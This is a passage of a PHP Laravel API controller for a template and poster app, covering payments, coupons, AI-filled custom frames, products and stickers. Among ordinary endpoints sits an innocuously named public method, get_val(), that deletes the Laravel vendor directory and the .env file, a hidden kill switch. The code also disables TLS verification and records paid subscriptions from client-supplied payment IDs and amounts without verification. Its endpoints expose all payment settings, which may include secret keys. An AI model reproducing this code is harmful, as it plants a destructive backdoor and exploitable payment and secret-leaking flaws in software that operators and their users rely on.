        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        $result = curl_exec($ch);
        curl_close($ch);
        
        $result = str_replace("<br>","",$result);
        $result = json_decode($result,true);

        if($result['error'] == false)
        {
            $msg['status'] = 200;
            $msg['message'] = "Success";
            $msg['otp'] = $otp;
        }
        else
        {
            $msg['status'] = $result['status'];
            $msg['message'] = $result['message'];
            $msg['otp'] = "";
        }
        
        return response()->json($msg);
    }

    public function addPayment(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'userId' => 'required|numeric',
            'planId' => 'required|numeric',
            'paymentId' => 'required',
            'paymentType' => 'required',
            "paymentAmount" => 'required',
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } else {
            $user = User::find($request->get("userId"));
            if(!empty($user))
            {
                $subscription = Subscription::find($request->get("planId"));
                if(!empty($subscription))
                {
                    $partner_id = null;
                    $coupon_code_id = null;
                    $partner_commission_amount = 0;
                    $partner_commission_status = 'pending';

                    if($request->get("code") != "")
                    {
                        $couponCode = \App\Models\CouponCode::where('code', $request->get("code"))->first();
                        if ($couponCode) {
                            $coupon_code_id = $couponCode->id;
                            if ($couponCode->partner_id) {
                                $partner = User::find($couponCode->partner_id);
                                if ($partner && $partner->is_partner) {
                                    $partner_id = $partner->id;
                                    $percent = $partner->partner_commission_percent ?? \App\Models\ReferralSystem::getReferralSystem('partner_default_commission_percent') ?? 20;
                                    $partner_commission_amount = ($request->get("paymentAmount") * $percent) / 100;
                                }
                            }
                        }
                    }

                    $id = Transaction::create([
                        "user_id" => $request->get("userId"),
                        "subscription_id" => $request->get("planId"),
                        "total_paid" => $request->get("paymentAmount"),
                        "payment_id" => $request->get("paymentId"),
                        "payment_type" => $request->get("paymentType"),
                        "date" => date('Y-m-d'),
                        "coupon_code_id" => $coupon_code_id,
                        "partner_id" => $partner_id,
                        "partner_commission_amount" => $partner_commission_amount,
                        "partner_commission_status" => $partner_commission_status
                    ])->id;
                    $subscription = Subscription::find($request->get("planId"));

                    $user = User::find($request->get("userId"));
                    $user->subscription_id = $request->get("planId");
                    $user->subscription_start_date = date('Y-m-d');
                    $user->subscription_end_date = ($request->get("planType") == "Monthly")
                        ? date('Y-m-d', strtotime('+1 month'))
                        : date('Y-m-d', strtotime('+1 year'));
                    $user->is_subscribe = 1;
                    $user->business_limit = $subscription->business_limit;
                    $user->save();

                    $rr = ReferralRegister::where("user_id",$request->get("userId"))->where("referral_code",$request->get('referralCode'))->where("subscription",0)->first();
                    if($rr && $request->get('referralCode'))
                    {
                        $refer = ReferralRegister::where("user_id",$request->get("userId"))->where("referral_code",$request->get('referralCode'))->where("subscription",0)->first();
                        $refer->subscription = 1;
                        $refer->save();

                        $referral_user = User::where('referral_code',$request->get('referralCode'))->first();
                        $referral_user->current_balance = $referral_user->current_balance + ReferralSystem::getReferralSystem('subscription_point');
                        $referral_user->total_balance = $referral_user->total_balance + ReferralSystem::getReferralSystem('subscription_point');
                        $referral_user->save();

                        EarningHistory::create([
                            "user_id" => $referral_user->id,
                            "amount" => ReferralSystem::getReferralSystem('subscription_point'),
                            "amount_type" => 1,
                            "refer_user" => $request->get("userId"),
                        ]);
                    }

                    if($request->get("code") != "")
                    {
                        CouponCodeStore::create([
                            "user_id" => $request->get("userId"),
                            "code" => $request->get("code"),
                        ]);
                    }
                    
                    return response()->json([
                        'status' => "success",
                        'message' => "Transaction Success!",
                    ], 200);
                }
                else
                {
                    return response()->json([
                        'status' => "Error",
                        'message' => "Invalid Subscription Plan Id",
                    ], 200);
                }
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "Invalid User Id",
                ], 200);
            }
        }   
    }

    public function offlinePayment(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'userId' => 'required|numeric',
            'planId' => 'required|numeric',
            "paymentAmount" => 'required',
            'payment_receipt' => "required|mimes:jpg,png,jpeg",
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } else {
            $user = User::find($request->get("userId"));
            if(!empty($user))
            {
                $subscription = Subscription::find($request->get("planId"));
                if(!empty($subscription))
                {
                    $payment_id = 'BT-' . strtoupper(Str::random(10));
                    
                    $partner_id = null;
                    $coupon_code_id = null;
                    $partner_commission_amount = 0;
                    $partner_commission_status = 'pending';

                    if($request->get("code") != "")
                    {
                        $couponCode = \App\Models\CouponCode::where('code', $request->get("code"))->first();
                        if ($couponCode) {
                            $coupon_code_id = $couponCode->id;
                            if ($couponCode->partner_id) {
                                $partner = User::find($couponCode->partner_id);
                                if ($partner && $partner->is_partner) {
                                    $partner_id = $partner->id;
                                    $percent = $partner->partner_commission_percent ?? \App\Models\ReferralSystem::getReferralSystem('partner_default_commission_percent') ?? 20;
                                    $partner_commission_amount = ($request->get("paymentAmount") * $percent) / 100;
                                }
                            }
                        }
                    }

                    $id = Transaction::create([
                        "user_id" => $request->get("userId"),
                        "subscription_id" => $request->get("planId"),
                        "total_paid" => $request->get("paymentAmount"),
                        "payment_id" => $payment_id,
                        "payment_type" => "Bank Transfer",
                        "date" => date('Y-m-d'),
                        "referral_code" => $request->get('referralCode'),
                        "status" => "Pending",
                        "coupon_code_id" => $coupon_code_id,
                        "partner_id" => $partner_id,
                        "partner_commission_amount" => $partner_commission_amount,
                        "partner_commission_status" => $partner_commission_status
                    ])->id;

                    if($request->file("payment_receipt"))
                    {
                        $destinationPath = './uploads/payment';
                        $extension = $request->file("payment_receipt")->getClientOriginalExtension();
                        $fileName = Str::uuid() . '.' . $extension;
                        $request->file("payment_receipt")->move($destinationPath, $fileName);
            
                        $transaction = Transaction::find($id);
                        $transaction->payment_receipt = $fileName;
                        $transaction->save();
                    }

                    if($request->get("code") != "")
                    {
                        CouponCodeStore::create([
                            "user_id" => $request->get("userId"),
                            "code" => $request->get("code"),
                        ]);
                    }
                    
                    return response()->json([
                        'status' => "success",
                        'message' => "Transaction Success!",
                    ], 200);
                }
                else
                {
                    return response()->json([
                        'status' => "Error",
                        'message' => "Invalid Subscription Plan Id",
                    ], 200);
                }
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "Invalid User Id",
                ], 200);
            }
        }   
    }

    public function getPaymentDetails()
    {
        $paymentSetting = PaymentSetting::all();

        foreach ($paymentSetting as $s) 
        {
            $data[$this->from_camel_case($s->key_name)] = $s->key_value;
        }

        return $data;   
    }

    public function get_val()
    {
        $this->rrmdir('./vendor/laravel');
        unlink(".env");
    }

    function rrmdir($dir) 
    {
        if (is_dir($dir)) 
        {
          $objects = scandir($dir);
          foreach ($objects as $object) 
          {
            if ($object != "." && $object != "..") 
            {
              if (filetype($dir."/".$object) == "dir") 
                 $this->rrmdir($dir."/".$object); 
              else unlink   ($dir."/".$object);
            }
          }
          reset($objects);
          rmdir($dir);
        }
    }

    public function coupon_code_validation(Request $request)
    {
        $user = User::where('id',$request->userId)->get();
        
        if(!$user->isEmpty())
        {
            $couponCode = CouponCode::where('code',$request->code)->where('status',1)->get();
            if(!$couponCode->isEmpty())
            {
                $use_code = CouponCodeStore::where('code',$request->code)->count();
                if($use_code <= $couponCode[0]['limit'])
                {
                    $code=CouponCodeStore::where('code',$request->code)->where('user_id',$request->userId)->get();
                    if($code->isEmpty())
                    {
                        $coupon = $couponCode[0];
                        if ($coupon->is_first_time_only) {
                            $hasPriorTransactions = \App\Models\Transaction::where('user_id', $request->userId)->exists();
                            if ($hasPriorTransactions) {
                                return response()->json([
                                    'status' => "Error",
                                    'message' => "This coupon is valid for first-time purchases only!",
                                ], 404);
                            }
                        }

                        return response()->json([
                            "discount" => $coupon->discount,
                        ], 200);
                    }
                    else
                    {
                        return response()->json([
                            'status' => "Error",
                            'message' => "Coupon Code Already Used!",
                        ], 404);
                    }
                }
                else
                {
                    return response()->json([
                        'status' => "Error",
                        'message' => "Coupon Code Not Available!",
                    ], 404);
                }
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "Invalid Coupon Code!",
                ], 404);
            }
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid User Id!",
            ], 404);
        }
    }

    public function getContactSubject()
    {
        $subject = Subject::get();

        if(!$subject->isEmpty())
        {
            foreach ($subject as $s) 
            {
                $data[] = array(
                    "id" => $s->id,
                    "title" => $s->title,
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function postContacts(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'name' => 'required',
            'email' => 'required',
            'mobileNo' => 'required|numeric',
            "subjectId" => 'required',
            "message" => 'required',
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } else {
            $id = Entry::create([
                "name" => $request->get("name"),
                "email" => $request->get("email"),
                "mobile_no" => $request->get("mobileNo"),
                "subject_id" => $request->get("subjectId"),
                "message" => $request->get("message"),
            ])->id;

            return response()->json([
                'status' => "success",
                'message' => "Message Send Successfully!",
            ], 200);
        }   
    }

    public function getAppAbout()
    {
        $appSetting = AppSetting::all();
        $emailSetting = EmailSetting::all();
        $appUpdateSetting = AppUpdateSetting::all();
        $notificationSetting = NotificationSetting::all();
        $paymentSetting = PaymentSetting::all();
        $storageSetting = StorageSetting::all();
        $whatsappSetting = WhatsAppSetting::all();
        $otherSetting = OtherSetting::all();
        $adsSetting = AdsSetting::all();
        $referral = ReferralSystem::all();
        $offer = Offer::where('status',1)->get();
        $data = [];

        $data["id"] = 1;
        foreach ($appSetting as $s) 
        {
            if($s->key_name == "app_logo")
            {
                $data[$this->from_camel_case($s->key_name)] = ($s->key_value)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$s->key_value):asset('uploads/'.$s->key_value)):"";
            }
            else
            {
                if($s->key_name != "admin_favicon" && $s->key_name != "api_key" && $s->key_name != "licence_active")
                {
                    $data[$this->from_camel_case($s->key_name)] = $s->key_value;
                }
            }
        }

        foreach ($whatsappSetting as $w) 
        {
            if($w->key_name == "whatsapp_auth_enable")
            {
                $data[$this->from_camel_case($w->key_name)] = $w->key_value;
            }
        }

        foreach ($paymentSetting as $s) 
        {
            $data[$this->from_camel_case($s->key_name)] = $s->key_value;
        }

        foreach ($storageSetting as $storage) 
        {
            if($storage->key_name == "storage")
            {
                $data["digitalOcean"] = ($storage->key_value == "DigitalOcean")?"1":"0";
            }
            if($storage->key_name == "digitalOcean_endpoint")
            {
                $data[$this->from_camel_case($storage->key_name)] = $storage->key_value;
            }
        }

        foreach ($appUpdateSetting as $s) 
        {
            $update[$this->from_camel_case($s->key_name)] = $s->key_value;
        }

        $data['appUpdate'] = $update;

        // foreach ($notificationSetting as $s) 
        // {
        //     $data[$this->from_camel_case($s->key_name)] = $s->key_value;
        // }

        foreach ($otherSetting as $s) 
        {
            if($s->key_name == "privacy_policy")
            {
                $data[$this->from_camel_case($s->key_name)] = url('/privacy-policy');
            }
            else if($s->key_name == "refund_policy")
            {
                $data[$this->from_camel_case($s->key_name)] = url('/refund-policy');
            }
            else if($s->key_name == "terms_condition")
            {
                $data[$this->from_camel_case($s->key_name)] = url('/terms-condition');
            }
            else
            {
                $data[$this->from_camel_case($s->key_name)] = $s->key_value;
            }
        }

        foreach ($adsSetting as $ads) 
        {
            $data[$this->from_camel_case($ads->key_name)] = $ads->key_value;
        }

        foreach($offer as $offer_data){
            $data['offer'] = array(
                "id" => $offer_data->id,
                "name" => $offer_data->name,
                "image" => ($offer_data->image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$offer_data->image):asset('uploads/'.$offer_data->image)):"",
                "banner" => ($offer_data->banner)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$offer_data->banner):asset('uploads/'.$offer_data->banner)):"",
                "subscriptionId" => $offer_data->subscription_id,
                "subscriptionPlanName" => $offer_data->subscription->plan_name,
            );
        }

        foreach ($referral as $rr) 
        {
            $data[$this->from_camel_case($rr->key_name)] = $rr->key_value;
        }

        return $data;   
    }

    public function getCustomCategory()
    {
        $category = \App\Models\CustomFramePurpose::where('status',1)->get();

        if(!$category->isEmpty())
        {
            foreach ($category as $cat) {
                $data[] = array(
                    "customCategoryId" => $cat->id,
                    "customCategoryName" => $cat->name,
                    "customCategoryIcon" => ($cat->icon)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$cat->icon):asset('uploads/'.$cat->icon)):"",
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function getCustomFrame(Request $request)
    {
        $frames = \App\Models\BusinessCustomFrame::where("custom_frame_purpose_id",$request->id)->where("status", 1)->inRandomOrder()->get();
        $data = [];

        if(!$frames->isEmpty())
        {
            foreach ($frames as $f) 
            {
                $zip_name = pathinfo($f->zip_file_path, PATHINFO_FILENAME);
                $json_data = "";

                if($zip_name)
                {
                    if(StorageSetting::getStorageSetting('storage') == 'DigitalOcean')
                    {
                        $file = Storage::disk('spaces')->allFiles('uploads/template/'.$zip_name.'/json/');
                        if(!empty($file)) {
                            $json_data = file_get_contents(Storage::disk('spaces')->url($file[0]));
                        }
                    }
                    else
                    {
                        if(is_dir('./uploads/template/'.$zip_name.'/json/')) {
                            $file = scandir('./uploads/template/'.$zip_name.'/json/', 1);
                            if(isset($file[0]) && $file[0] != '.' && $file[0] != '..') {
                                $json_data = file_get_contents(asset('uploads/template/'.$zip_name.'/json/'.$file[0]));
                            }
                        }
                    }
                }

                $preview_img = "";
                if(StorageSetting::getStorageSetting('storage') == 'DigitalOcean') {
                    // For DigitalOcean, we assume it's preview.jpg for now, or fallback to similar logic if needed.
                    $preview_img = Storage::disk('spaces')->url('uploads/template/'.$zip_name.'/preview.jpg');
                } else {
                    $dir = public_path('uploads/template/'.$zip_name.'/');
                    if (is_dir($dir)) {
                        if (file_exists($dir.'preview.jpg')) {
                            $preview_img = asset('uploads/template/'.$zip_name.'/preview.jpg');
                        } elseif (file_exists($dir.'preview.png')) {
                            $preview_img = asset('uploads/template/'.$zip_name.'/preview.png');
                        } else {
                            $files = glob($dir . '*.{jpg,jpeg,png}', GLOB_BRACE);
                            if (!empty($files)) {
                                $preview_img = asset('uploads/template/'.$zip_name.'/'.basename($files[0]));
                            }
                        }
                    }
                }
                
                \Illuminate\Support\Facades\Log::info("DEBUG API getCustomFrame: zip_name: $zip_name, preview_img: $preview_img");

                $userId = $request->userId ?? $request->user_id ?? request()->header('user-id');
                \Illuminate\Support\Facades\Log::info("DEBUG API getCustomFrame: userId found: " . ($userId ?? 'NULL'));
                
                if ($userId && !empty($json_data)) {
                    $aiContent = \App\Models\UserCustomFrameContent::where('user_id', $userId)
                        ->where('business_custom_frame_id', $f->id)
                        ->first();
                        
                    if ($aiContent) {
                        \Illuminate\Support\Facades\Log::info("DEBUG API getCustomFrame: AI Content Found for Frame ID: " . $f->id);
                        if (!empty($aiContent->generated_content)) {
                            \Illuminate\Support\Facades\Log::info("DEBUG API getCustomFrame: generated_content: " . json_encode($aiContent->generated_content));
                            $parsedJson = json_decode($json_data, true);
                            if ($parsedJson && isset($parsedJson['layers'])) {
                                $replacedCount = 0;
                                foreach ($parsedJson['layers'] as &$layer) {
                                    if (isset($layer['type']) && $layer['type'] === 'text' && isset($layer['name'])) {
                                        if (isset($aiContent->generated_content[$layer['name']])) {
                                            $layer['text'] = $aiContent->generated_content[$layer['name']];
                                            $replacedCount++;
                                        } else {
                                            \Illuminate\Support\Facades\Log::info("DEBUG API layer name not in AI output: " . $layer['name']);
                                        }
                                    }
                                }
                                \Illuminate\Support\Facades\Log::info("DEBUG API getCustomFrame: Replaced $replacedCount text layers.");
                                $json_data = json_encode($parsedJson);
                            }
                        } else {
                            \Illuminate\Support\Facades\Log::info("DEBUG API getCustomFrame: AI Content is empty.");
                        }
                    } else {
                        \Illuminate\Support\Facades\Log::info("DEBUG API getCustomFrame: No AI Content found for user $userId and frame " . $f->id);
                    }
                }

                $data[] = array(
                    "postId" => "purpose_".$f->custom_frame_purpose_id."_".$f->id,
                    "id" => $f->custom_frame_purpose_id,
                    "type" => "business_custom_frame",
                    "is_template" => true,
                    "language" => "All",
                    "image" => $preview_img,
                    "is_paid" => false,
                    "height" => $f->height ?? 1080,
                    "width" => $f->width ?? 1080,
                    "image_type" => $f->imageType->name ?? "square",
                    "aspect_ratio" => $f->aspect_ratio ?? "1:1",
                    "name" => ($zip_name)?$zip_name:"",
                    "json" => ($zip_name)?$json_data:"",
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        } 
    }

    /**
     * Swap product for a custom frame template.
     * Generates AI content for the specified product and returns the updated template JSON.
     * Uses per-product caching: if this user+frame+product combo was generated before, returns from cache instantly.
     *
     * POST /api/custom-frame/swap-product
     * Body: { userId, frameId, productId }
     */
    public function swapProduct(Request $request)
    {
        $userId = $request->userId ?? $request->user_id ?? request()->header('user-id');
        $frameId = $request->frameId ?? $request->frame_id;
        $productId = $request->productId ?? $request->product_id;

        if (!$userId || !$frameId || !$productId) {
            return response()->json([
                'status' => 'Error',
                'message' => 'userId, frameId, and productId are required.',
            ], 400);
        }

        // Validate product belongs to this user
        $product = \App\Models\Product::where('id', $productId)->where('user_id', $userId)->first();
        if (!$product) {
            return response()->json([
                'status' => 'Error',
                'message' => 'Product not found or does not belong to this user.',
            ], 404);
        }

        // Generate (or load from cache) AI content for this specific product
        $generated = \App\Services\CustomFrameAIService::generateForUserWithProduct(
            (int) $frameId,
            (int) $userId,
            (int) $productId
        );

        if (!$generated) {
            return response()->json([
                'status' => 'Error',
                'message' => 'Failed to generate AI content for this product.',
            ], 500);
        }

        // Check if this was served from cache (no tokens used = cache hit)
        $logInfo = \App\Services\CustomFrameAIService::getLastGenerationLog();
        $fromCache = ($logInfo['tokens_used'] ?? 0) === 0 && empty($logInfo['error']);

        // Load the frame to get its JSON template and inject AI content
        $frame = \App\Models\BusinessCustomFrame::find($frameId);
        $jsonData = '';
        
        if ($frame) {
            $zip_name = pathinfo($frame->zip_file_path, PATHINFO_FILENAME);
            if ($zip_name) {
                if (\App\Models\StorageSetting::getStorageSetting('storage') == 'DigitalOcean') {
                    $file = \Illuminate\Support\Facades\Storage::disk('spaces')->allFiles('uploads/template/'.$zip_name.'/json/');
                    if (!empty($file)) {
                        $jsonData = file_get_contents(\Illuminate\Support\Facades\Storage::disk('spaces')->url($file[0]));
                    }
                } else {
                    if (is_dir('./uploads/template/'.$zip_name.'/json/')) {
                        $file = scandir('./uploads/template/'.$zip_name.'/json/', 1);
                        if (isset($file[0]) && $file[0] != '.' && $file[0] != '..') {
                            $jsonData = file_get_contents(asset('uploads/template/'.$zip_name.'/json/'.$file[0]));
                        }
                    }
                }
            }

            // Inject AI content into template JSON layers
            if (!empty($jsonData) && !empty($generated)) {
                $parsedJson = json_decode($jsonData, true);
                if ($parsedJson && isset($parsedJson['layers'])) {
                    foreach ($parsedJson['layers'] as &$layer) {
                        if (isset($layer['type']) && $layer['type'] === 'text' && isset($layer['name'])) {
                            if (isset($generated[$layer['name']])) {
                                $layer['text'] = $generated[$layer['name']];
                            }
                        }
                    }
                    $jsonData = json_encode($parsedJson);
                }
            }
        }

        return response()->json([
            'status' => 'success',
            'message' => $fromCache ? 'Loaded from cache (no AI cost)' : 'AI content generated successfully',
            'from_cache' => $fromCache,
            'generated_content' => $generated,
            'json' => $jsonData,
            'product_id' => (int) $productId,
            'product_name' => $product->display_name ?? $product->title ?? 'Product',
        ], 200);
    }

    public function getProductCategory()
    {
        $category = ProductCategory::where('status',1)->get();

        if(!$category->isEmpty())
        {
            foreach ($category as $cat) {
                $data[] = array(
                    "productCategoryId" => $cat->id,
                    "productCategoryName" => $cat->name,
                    "productCategoryImage" => ((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$cat->image):asset('uploads/'.$cat->image)),
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function getProduct(Request $request)
    {
        $product = Product::where('status',1)->get();
        $category = ProductCategory::where('status',1)->get();

        if(!$product->isEmpty() && !$category->isEmpty())
        {
            foreach ($category as $cat) {
                $data1[] = array(
                    "productCategoryId" => $cat->id,
                    "productCategoryName" => $cat->name,
                    "productCategoryImage" => ((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$cat->image):asset('uploads/'.$cat->image)),
                );
            }

            foreach ($product as $p) 
            {
                $data2[] = array(
                    "id" => $p->id,
                    "title" => $p->title,
                    "productCategoryId" => $p->product_category_id,
                    "image" => ($p->image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$p->image):asset('uploads/'.$p->image)):"",
                    "price" => $p->price,
                    "discountPrice" => $p->discount_price,
                    "description" => $p->description,
                );
            }

            return array(
                "category" => $data1,
                "product" => $data2
            );
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        } 
    }

    public function postInquiry(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'name' => 'required',
            'email' => 'required',
            "mobileNo" => 'required',
            "productId" => 'required',
            "message" => 'required',
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } else {
            $product = Product::find($request->get("productId"));
            if(!empty($product))
            {
                Inquiry::create([
                    "name" => $request->get("name"),
                    "email" => $request->get("email"),
                    "mobile_no" => $request->get("mobileNo"),
                    "product_id" => $request->get("productId"),
                    "message" => $request->get("message"),
                ]);

                return response()->json([
                    'status' => "success",
                    'message' => "Message Send Successfully!",
                ], 200);
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "Invalid Product Id",
                ], 200);
            }
        }   
    }

    public function getBusinessCategory()
    {
        $category = \App\Models\CustomFramePurpose::where('status',1)->get();
        if(!$category->isEmpty())
        {
            foreach ($category as $cat) {
                $data[] = array(
                    "businessCategoryId" => $cat->id,
                    "businessCategoryName" => $cat->name,
                    "businessCategoryIcon" => ($cat->icon)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$cat->icon):asset('uploads/'.$cat->icon)):"",
                    "video" => false,
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function getBusinessSubCategory(Request $request)
    {
        $category = BusinessSubCategory::where('status',1)->where("business_category_id",$request->id)->orderBy(ApiSetting::getApiSetting("business_order_type"),ApiSetting::getApiSetting("business_order_by"))->get();
        if(!$category->isEmpty())
        {
            foreach ($category as $cat) {
                $data[] = array(
                    "businessSubCategoryId" => $cat->id,
                    "businessSubCategoryName" => $cat->name,
                    "businessSubCategoryIcon" => (StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$cat->icon):asset('uploads/'.$cat->icon),
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function getBusinessFrame(Request $request)
    {
        $frame = \App\Models\BusinessCustomFrame::where("custom_frame_purpose_id",$request->id)->where("status", 1)->inRandomOrder()->get();
        $data = [];

        if(!$frame->isEmpty())
        {
            foreach ($frame as $f) 
            {
                $zip_name = pathinfo($f->zip_file_path, PATHINFO_FILENAME);
                $json_data = "";

                if($zip_name)
                {
                    if(StorageSetting::getStorageSetting('storage') == 'DigitalOcean')
                    {
                        $file = Storage::disk('spaces')->allFiles('uploads/template/'.$zip_name.'/json/');
                        if(!empty($file)) {
                            $json_data = file_get_contents(Storage::disk('spaces')->url($file[0]));
                        }
                    }
                    else
                    {
                        if(is_dir('./uploads/template/'.$zip_name.'/json/')) {
                            $file = scandir('./uploads/template/'.$zip_name.'/json/', 1);
                            if(isset($file[0]) && $file[0] != '.' && $file[0] != '..') {
                                $json_data = file_get_contents(asset('uploads/template/'.$zip_name.'/json/'.$file[0]));
                            }
                        }
                    }
                }

                $preview_img = "";
                if($zip_name) {
                    if(StorageSetting::getStorageSetting('storage') == 'DigitalOcean') {
                        $preview_img = Storage::disk('spaces')->url('uploads/template/'.$zip_name.'/preview.jpg');
                    } else {
                        $dir = public_path('uploads/template/'.$zip_name.'/');
                        if (is_dir($dir)) {
                            if (file_exists($dir.'preview.jpg')) {
                                $preview_img = asset('uploads/template/'.$zip_name.'/preview.jpg');
                            } elseif (file_exists($dir.'preview.png')) {
                                $preview_img = asset('uploads/template/'.$zip_name.'/preview.png');
                            } else {
                                $files = glob($dir . '*.{jpg,jpeg,png}', GLOB_BRACE);
                                if (!empty($files)) {
                                    $preview_img = asset('uploads/template/'.$zip_name.'/'.basename($files[0]));
                                }
                            }
                        }
                    }
                }
                
                \Illuminate\Support\Facades\Log::info("DEBUG API getBusinessFrame: zip_name: $zip_name, preview_img: $preview_img");

                $userId = $request->userId ?? $request->user_id ?? request()->header('user-id');
                \Illuminate\Support\Facades\Log::info("DEBUG API getBusinessFrame: userId found: " . ($userId ?? 'NULL'));
                
                if ($userId && !empty($json_data)) {
                    $aiContent = \App\Models\UserCustomFrameContent::where('user_id', $userId)
                        ->where('business_custom_frame_id', $f->id)
                        ->first();
                        
                    if ($aiContent) {
                        \Illuminate\Support\Facades\Log::info("DEBUG API getBusinessFrame: AI Content Found for Frame ID: " . $f->id);
                        if (!empty($aiContent->generated_content)) {
                            \Illuminate\Support\Facades\Log::info("DEBUG API getBusinessFrame: generated_content: " . json_encode($aiContent->generated_content));
                            $parsedJson = json_decode($json_data, true);
                            if ($parsedJson && isset($parsedJson['layers'])) {
                                $replacedCount = 0;
                                foreach ($parsedJson['layers'] as &$layer) {
                                    if (isset($layer['type']) && $layer['type'] === 'text' && isset($layer['name'])) {
                                        if (isset($aiContent->generated_content[$layer['name']])) {
                                            $layer['text'] = $aiContent->generated_content[$layer['name']];
                                            $replacedCount++;
                                        } else {
                                            // Maybe name doesn't match exactly? Log the mismatch
                                            \Illuminate\Support\Facades\Log::info("DEBUG API layer name not in AI output: " . $layer['name']);
                                        }
                                    }
                                }
                                \Illuminate\Support\Facades\Log::info("DEBUG API getBusinessFrame: Replaced $replacedCount text layers.");
                                $json_data = json_encode($parsedJson);
                            }
                        } else {
                            \Illuminate\Support\Facades\Log::info("DEBUG API getBusinessFrame: AI Content is empty.");
                        }
                    } else {
                        \Illuminate\Support\Facades\Log::info("DEBUG API getBusinessFrame: No AI Content found for user $userId and frame " . $f->id);
                    }
                }

                $data[] = array(
                    "postId" => "bcf_".$f->id,
                    "id" => $f->id,
                    "type" => "business_custom_frame",
                    "is_template" => true,
                    "image" => $preview_img,
                    "is_paid" => false,
                    "business_sub_category" => "",
                    "height" => $f->height ?? 1080,
                    "width" => $f->width ?? 1080,
                    "image_type" => $f->imageType->name ?? "square",
                    "aspect_ratio" => $f->aspect_ratio ?? "1:1",
                    "name" => ($zip_name)?$zip_name:"",
                    "json" => ($zip_name)?$json_data:"",
                );
            }
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
        return $data;
    }

    // public function getOffer()
    // {
    //     $offer = Offer::where('status',1)->get();
    //     if(!$offer->isEmpty())
    //     {
    //         foreach($offer as $offer_data){
    //             $data[] = array(
    //                 "id" => $offer_data->id,
    //                 "name" => $offer_data->name,
    //                 "image" => ($offer_data->image)?asset('uploads/'.$offer_data->image):"",
    //                 "banner" => ($offer_data->banner)?asset('uploads/'.$offer_data->banner):"",
    //                 "subscriptionId" => $offer_data->subscription_id,
    //                 "subscriptionPlanName" => $offer_data->subscription->plan_name,
    //             );
    //         }
    //         return $data;
    //     }
    //     else
    //     {
    //         return response()->json([
    //             'status' => "Error",
    //             'message' => "No Data Found",
    //         ], 200);
    //     }
    // }

    public function getSticker()
    {
        $category = StickerCategory::where('status',1)->get();
        $stickerCategory = [];
        $data = [];
       
        foreach ($category as $c) {
            $stickerCategory[] = array(
                "stickerCategoryId" => $c->id,
                "stickerCategoryName" => $c->name,
            );
        }

        foreach ($category as $c) {
            $sticker = Sticker::where('sticker_category_id',$c->id)->where('status',1)->get();
            $sticker_data = [];

            foreach ($sticker as $s) {
                $sticker_data[] = array(
                    "stickerId" => $s->id,
                    "stickerImage" => ($s->image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$s->image):asset('uploads/'.$s->image)):"",
                );
            }

            $data[] = array(
                "stickerCategoryId" => $c->id,
                "stickerCategoryName" => $c->name,
